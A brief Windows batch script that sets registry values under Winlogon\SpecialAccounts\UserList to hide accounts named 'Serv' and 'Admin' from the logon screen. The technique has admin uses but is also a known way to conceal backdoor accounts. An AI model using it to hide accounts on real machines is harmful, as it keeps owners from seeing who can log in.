@ECHO off

set _key=HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
set _value=0

for %%i in (Serv, Admin) do reg ADD "%_key%" /v %%i /d %_value% /t REG_DWORD /f
exit
